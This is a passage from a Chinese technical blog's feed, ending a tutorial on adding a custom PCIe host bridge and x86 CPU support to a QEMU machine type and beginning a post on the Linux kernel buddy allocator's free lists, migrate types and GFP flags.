class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci-host/a3pc.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/error-report.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_host_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// nothing to do</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_set_irq</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, <span class="hljs-type">int</span> irq_num, <span class="hljs-type">int</span> level)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (irq %d, level %d)&quot;</span>,<br>                irq_num, level);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_pcie_swizzle_map_irq_fn</span><span class="hljs-params">(PCIDevice *pci_dev, <span class="hljs-type">int</span> pin)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (pin %d)&quot;</span>, pin);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_realize</span><span class="hljs-params">(DeviceState *dev, Error **errp)</span><br>&#123;<br>    PCIHostState *pci = PCI_HOST_BRIDGE(dev);<br>    A3PCPCIEHost *h = A3_PC_PCIE_HOST(dev);<br>    SysBusDevice *sbd = SYS_BUS_DEVICE(dev);<br><br>    memory_region_init(&amp;h-&gt;mem, OBJECT(h), <span class="hljs-string">&quot;a3-pc-mem&quot;</span>, <span class="hljs-number">16</span>);<br>    memory_region_init(&amp;h-&gt;io, OBJECT(h), <span class="hljs-string">&quot;a3-pc-io&quot;</span>, <span class="hljs-number">16</span>);<br>    sysbus_init_mmio(sbd, &amp;h-&gt;mem);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * A PCIe host in QEMU is required to provide</span><br><span class="hljs-comment">     * a pair of callbacks: set_irq() and map_irq()</span><br><span class="hljs-comment">     */</span><br>    pci-&gt;bus = pci_register_root_bus(dev, <span class="hljs-string">&quot;a3-pcie0&quot;</span>,<br>                                    a3_pc_pcie_set_irq,<br>                                    a3_pc_pcie_swizzle_map_irq_fn,<br>                                    h, &amp;h-&gt;mem, &amp;h-&gt;io, <br>                                    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, TYPE_PCIE_BUS);<br>&#125;<br><br><span class="hljs-type">static</span> Property a3_pc_pcie_host_props[] = &#123;<br>    DEFINE_PROP_END_OF_LIST(),<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br><br>    dc-&gt;realize = a3_pc_pcie_host_realize;<br>    set_bit(DEVICE_CATEGORY_BRIDGE, dc-&gt;categories);<br>    device_class_set_props(dc, a3_pc_pcie_host_props);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_pcie_host = &#123;<br>    .name = TYPE_A3_PC_PCIE_HOST,<br>    .parent = TYPE_PCI_HOST_BRIDGE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCPCIEHost),<br>    .instance_init = a3_pc_host_init,<br>    .class_init = a3_pc_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register(&amp;a3_pc_pcie_host);<br>&#125;<br><br>type_init(a3_pc_pcie_host_register);<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：hw&#x2F;pci-host&#x2F;meson.build</p><blockquote><p>老版本没测了，自己想该怎么改吧（笑）</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs meson"># A3 devices<br>pci_ss.add(when: &#x27;CONFIG_PCI&#x27;, if_true: files(&#x27;a3pc.c&#x27;))<br></code></pre></td></tr></table></figure><p>之后我们在我们的机器类型中加上 PCI 相关的两个指针成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br></code></pre></td></tr></table></figure><p>最后在机器初始化函数中初始化一个我们自定义的这个 PCIe 设备即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br>    DeviceState *dev = qdev_new(TYPE_A3_PC_PCIE_HOST);<br><br>    sysbus_realize_and_unref(SYS_BUS_DEVICE(dev), &amp;error_fatal);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意新版本和老版本的 API 不同，在老版本中应当使用如下 API：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    DeviceState *dev = qdev_create(<span class="hljs-literal">NULL</span>, TYPE_A3_PC_PCIE_HOST);<br><br>    qdev_init_nofail(dev);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>完成这些步骤之后我们的新机器就能随意插入各种 PCI 设备了；）</p><h3 id="II、添加新的-CPU-插槽🕊"><a href="#II、添加新的-CPU-插槽🕊" class="headerlink" title="II、添加新的 CPU 插槽🕊"></a>II、添加新的 CPU 插槽🕊</h3><p>当然，我们的机器还缺少了 CPU，没有 CPU 的机器自然是跑不起来的，因此这里我们还需要在我们的机器类型当中添加上相应的 CPU 插槽，由于 Qemu 内部的基础 x86 机器架构已经实现好了基础框架，所以我们直接改为继承自对应的 x86 基础机器类即可</p><blockquote><p>当然，如果是纯纯自定义的异架构，这里还是得自己手动写一套…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineClass parent;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br><br>    <span class="hljs-comment">/* Default CPU model version.  See x86_cpu_set_default_version(). */</span><br>    <span class="hljs-type">int</span> default_cpu_version;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>不过机器定义的文件当中需要改动的部分会比预想的要多，<del>所以这里就先🕊🕊🕊了</del></p><h3 id="Extra-自定义-CPU-🕊"><a href="#Extra-自定义-CPU-🕊" class="headerlink" title="Extra.自定义 CPU 🕊"></a>Extra.自定义 CPU 🕊</h3><blockquote><p>🕊🕊🕊</p></blockquote><h2 id="四、编译运行🕊"><a href="#四、编译运行🕊" class="headerlink" title="四、编译运行🕊"></a>四、编译运行🕊</h2><p>由于我们新建立的机器类型为 <code>x86</code> 架构的机器，因此我们需要在执行 configure 脚本时指定 <code>--target-list=x86_64-softmmu</code> </p><p>这里需要注意的是前前面笔者提供了两种设置 <code>CONFIG_A3_PC</code> 的选项：如果我们是直接通过修改 <code>default.mak</code> 使得 <code>CONFIG_A3_PC=y</code>，则直接编译即可；若我们是通过修改了 <code>configure</code> 来指定 <code>CONFIG_A3_PC</code> 的值，则创建编译脚本的时候我们需要手动指定 <code>--enable-a3-pc</code> 来编译上我们新增的机器类型</p><p>编译完成后我们便能够看到我们新添加的机器类型 <code>a3-pc</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">./qemu-system-x86_64 -machine ?</span><br>Supported machines are:<br>microvm              microvm (i386)<br>pc                   Standard PC (i440FX + PIIX, 1996) (alias of pc-i440fx-7.0)<br>pc-i440fx-7.0        Standard PC (i440FX + PIIX, 1996) (default)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">...</span><br>a3-pc                (null)<br></code></pre></td></tr></table></figure><blockquote><p>🕊🕊🕊</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;不如 VMWare👋&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x03】Linux内核内存管理II - Buddy System</title>
    <link href="http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/</id>
    <published>2022-06-30T15:44:49.000Z</published>
    <updated>2022-08-28T20:46:32.058Z</updated>
    
    <content type="html"><![CDATA[<p>HEY DUDE!</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>在<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">上一篇文章</a>中笔者简要阐述了 Linux 内核当中内存的基本组织架构：页、区、节点，在本篇文章当中笔者将阐述内核中最<strong>基础</strong>的内存分配器——<strong>Buddy Systen</strong>（伙伴系统）</p><blockquote><p>通过读取 <code>/proc/buddyinfo</code> 可以获取当前系统中 buddy system 的详细信息</p><p><img src="https://i.loli.net/2021/11/30/eRiVXpyUkncYZus.png" alt="image.png"></p><blockquote><p>笔者的💻配置比较🚮，所以只有一个 node，非常抱歉…</p></blockquote></blockquote><blockquote><p>这篇文章其实很早就写了个框架了，但是后面一直没有来得及进行补完…（其实就是懒而已吧（恼））</p><p><img src="https://s2.loli.net/2022/06/08/7VaQ6riZOcmDuEg.png" alt="image.png"></p></blockquote><h1 id="0x01-buddy-system-中的内存组织形式"><a href="#0x01-buddy-system-中的内存组织形式" class="headerlink" title="0x01.buddy system 中的内存组织形式"></a>0x01.buddy system 中的内存组织形式</h1><h2 id="zone-中的-free-area-结构体数组"><a href="#zone-中的-free-area-结构体数组" class="headerlink" title="zone 中的 free_area 结构体数组"></a>zone 中的 free_area 结构体数组</h2><p>前文中我们讲到，每个 zone 结构体中都有一个 free_area 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span><span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>其中的 <code>MAX_ORDER</code> 为一个常量，值为 11</p><p>在 buddy system 中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：<br>$$<br>2^{order}<br>$$<br>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，由此我们得到这样一张_Overview_：</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>下面我们来解析 <code>free_area</code> 的具体结构，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">free_list</span>[<span class="hljs-title">MIGRATE_TYPES</span>];</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>nr_free;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="free-list：空闲页面双向链表"><a href="#free-list：空闲页面双向链表" class="headerlink" title="free_list：空闲页面双向链表"></a>free_list：空闲页面双向链表</h3><p>我们不难看出：free_area 的 free_list 字段便是用以存放指向空闲页面的指针，其通过 page 结构体的 <code>lru</code> 字段将 page 结构体连接成双向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* 页缓存与匿名页 */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @lru: Pageout 链表, 例如 active_list 便由</span><br><span class="hljs-comment"> * lruvec-&gt;lru_lock 保护。  </span><br><span class="hljs-comment"> * 有时会被页所有者作为常规链表使用。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lru</span>;</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>page 结构体中的 <code>lru</code> 这一字段的类型为 <code>struct list_head</code>，这是内核编程中通用的双向链表结构，<strong>free_list 与 lru 链表都使用该字段</strong> 将页结构体组织为_双向链表_，即_一个页是不可能同时出现在 lru 链表与 buddy system 中的_</p><h4 id="迁移类型分链表"><a href="#迁移类型分链表" class="headerlink" title="迁移类型分链表"></a><em>迁移类型分链表</em></h4><p>在这里我们注意到free_area 中<strong>并非只有一个双向链表</strong>，而是按照不同的“迁移类型”（migrate type）进行分开存放，这是由于_页面迁移_机制的存在</p><p>页面迁移主要用以解决内核空间中的<strong>碎片问题</strong>，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核<strong>有可能无法映射到足够大的连续内存</strong>，因此需要进行_页面迁移_——将旧的页面迁移到新的位置</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>但<strong>并非所有的页面都是能够随意迁移的</strong>，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类</p><p>迁移类型由一个枚举类型定义，定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migratetype</span> &#123;</span><br>MIGRATE_UNMOVABLE,<br>MIGRATE_MOVABLE,<br>MIGRATE_RECLAIMABLE,<br>MIGRATE_PCPTYPES,<span class="hljs-comment">/* the number of types on the pcp lists */</span><br>MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_CMA migration type is designed to mimic the way</span><br><span class="hljs-comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span><br><span class="hljs-comment"> * from MIGRATE_CMA pageblocks and page allocator never</span><br><span class="hljs-comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The way to use it is to change migratetype of a range of</span><br><span class="hljs-comment"> * pageblocks to MIGRATE_CMA which can be done by</span><br><span class="hljs-comment"> * __free_pageblock_cma() function.  What is important though</span><br><span class="hljs-comment"> * is that a range of pageblocks must be aligned to</span><br><span class="hljs-comment"> * MAX_ORDER_NR_PAGES should biggest page be bigger then</span><br><span class="hljs-comment"> * a single pageblock.</span><br><span class="hljs-comment"> */</span><br>MIGRATE_CMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span><br>MIGRATE_ISOLATE,<span class="hljs-comment">/* can&#x27;t allocate from here */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>MIGRATE_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>：这类型页面在内存当中有着固定的位置，<strong>不能移动</strong></li><li><strong>MIGRATE_MOVABLE</strong>：这类页面<strong>可以随意移动</strong>，例如用户空间的页面，我们只需要复制数据后改变页表映射即可</li><li><strong>MIGRATE_RECLAIMABLE</strong>：这类页面<strong>不能直接移动，但是可以删除</strong>，例如映射自文件的页</li><li><strong>MIGRATE_PCPTYPES</strong>：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移<strong>仅限于同一节点内</strong></li><li><strong>MIGRATE_CMA</strong>：<code>Contiguous Memory Allocator</code>，即<strong>连续的物理内存</strong></li><li><strong>MIGRATE_ISOLATE</strong>：<strong>不能从该链表分配页面</strong>，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点</li><li><em>MIGRATE_TYPES_：表示迁移类型的数目，_并不存在这一链表</em></li></ul><p>以 <em>free_list[0]</em> 作为例子，我们可以得到如下 overview：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><h3 id="nr-free：空闲页面（块）计数"><a href="#nr-free：空闲页面（块）计数" class="headerlink" title="nr_free：空闲页面（块）计数"></a>nr_free：空闲页面（块）计数</h3><p>该字段记录了在当前 free_area 中的空闲页面块的数量，对于 free_area[0] 以外的 free_area 而言其单位并非是单个页框，而是以_内存块_为单位</p><h1 id="0x02-页的分配"><a href="#0x02-页的分配" class="headerlink" title="0x02.页的分配"></a>0x02.页的分配</h1><p>buddy system 提供了一组用以进行页面分配的接口，接下来笔者将以自底向上的方式进行源码分析</p><h2 id="一、GFP（get-free-page）标志位"><a href="#一、GFP（get-free-page）标志位" class="headerlink" title="一、GFP（get free page）标志位"></a>一、GFP（get free page）标志位</h2><blockquote><p>GFP标志位这一节基本上搬运自<a href="https://blog.csdn.net/yhb1047818384/article/details/112298996">这篇文章</a></p></blockquote><p>在 kernel memory allocation 中我们经常能见到 <code>gfp_t</code> 类型，其表示分配时的标志位，定义在 <code>include/linux/gfp.h</code> 中，大概有如下这些可用标志位：</p><ul><li><strong>内存管理区修饰符 (zone modifiers)</strong></li></ul><p>内存管理区修饰符主要描述从哪些内存管理区来分配内存</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_DMA</td><td align="left">从ZONE_DMA区中分配内存</td></tr><tr><td align="left">__GFP_HIGNMEM</td><td align="left">从ZONE_HIGHMEM区中分配内存</td></tr><tr><td align="left">__GFP_DMA32</td><td align="left">从ZONE_DMA32区中分配内存</td></tr><tr><td align="left">__GFP_MOVABLE</td><td align="left">内存规整时可以迁移或回收页面</td></tr></tbody></table><ul><li><strong>移动和替换修饰符(mobility and placement modifiers)</strong></li></ul><p>移动和替换修饰符主要表示分配出来的页面具有的迁移属性</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_RECLAIMABLE</td><td align="left">分配的内存页面可以回收</td></tr><tr><td align="left">__GFP_WRITE</td><td align="left">申请的页面会被弄成脏页</td></tr><tr><td align="left">__GFP_HARDWALL</td><td align="left">强制使用cpuset内存分配策略</td></tr><tr><td align="left">__GFP_THISNODE</td><td align="left">在指定的节点上分配内存</td></tr><tr><td align="left">__GFP_ACCOUNT</td><td align="left">kmemcg会记录分配过程</td></tr></tbody></table><ul><li><strong>水位修饰符 （watermark modifiers）</strong></li></ul><p>与水位线相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_ATOMIC</td><td align="left">高优先级分配内存，分配器可以分配最低警戒水位线下的预留内存</td></tr><tr><td align="left">__GFP_HIGH</td><td align="left">分配内存的过程中不可以睡眠或执行页面回收动作</td></tr><tr><td align="left">__GFP_MEMALLOC</td><td align="left">允许访问所有的内存</td></tr><tr><td align="left">__GFP_NOMEMALLOC</td><td align="left">不允许访问最低警戒水位线下的系统预留内存</td></tr></tbody></table><ul><li><strong>页面回收修饰符（reclaim modifiers)</strong></li></ul><p>与页面回收相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_IO</td><td align="left">启动物理I&#x2F;O传输</td></tr><tr><td align="left">__GFP_FS</td><td align="left">允许调用底层FS文件系统。可避免分配器递归到可能已经持有锁的文件系统中， 避免死锁</td></tr><tr><td align="left">__GFP_DIRECT_RECLAIM</td><td align="left">分配内存过程中可以使用直接内存回收</td></tr><tr><td align="left">__GFP_KSWAPD_RECLAIM</td><td align="left">内存到达低水位时唤醒kswapd线程异步回收内存</td></tr><tr><td align="left">__GFP_RECLAIM</td><td align="left">表示是否可以直接内存回收或者使用kswapd线程进行回收</td></tr><tr><td align="left">__GFP_RETRY_MAYFAIL</td><td align="left">分配内存可以可能会失败，但是在申请过程中会回收一些不必要的内存，是整个系统受益</td></tr><tr><td align="left">__GFP_NOFAIL</td><td align="left">内存分配失败后无限制的重复尝试，知道分配成功</td></tr><tr><td align="left">__GFP_NORETRY</td><td align="left">直接页面回收或者内存规整后还是无法分配内存时，不启用retry反复尝试分配内存，直接返回NULL</td></tr></tbody></table><ul><li><strong>行为修饰符 (action modifiers)</strong></li></ul><p>与分配时的行为相关的标志位</p><table><thead><tr><th align="left">flag</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">__GFP_NOWARN</td><td align="left">关闭内存分配过程中的WARNING</td></tr><tr><td align="left">__GFP_COMP</td><td align="left">分配的内存页面将被组合成复合页compound page</td></tr><tr><td align="left">__GFP_ZERO</td><td align="left">返回一个全部填充为0的页面</td></tr></tbody></table><ul><li><strong>组合类型标志(Useful GFP flag combinations)</strong></li></ul><p>前面描述的修饰符种过于繁多，因此linux定义了一些组合的类型标志，供开发者使用。</p><table><thead><tr><th align="left">flag</th><th align="left">element</th><th align="left">description</th></tr></thead><tbody><tr><td align="left">GFP_ATOMIC</td><td align="left">__GFP_HIGH |__GFP_ATOMIC |__GFP_KSWAPD_RECLAIM</td><td align="left">分配过程不能休眠，分配具有高优先级，可以访问系统预留内存</td></tr><tr><td align="left">GFP_KERNEL</td><td 